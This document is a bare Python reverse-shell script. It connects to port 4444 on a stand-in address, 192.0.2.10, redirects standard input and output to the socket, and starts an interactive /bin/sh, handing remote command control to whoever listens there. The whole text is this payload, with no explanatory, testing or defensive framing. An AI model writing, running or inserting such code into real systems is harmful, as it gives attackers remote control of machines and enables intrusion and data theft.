import os
import socket

s = socket.socket()
s.connect(("192.0.2.10", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.system("/bin/sh -i")
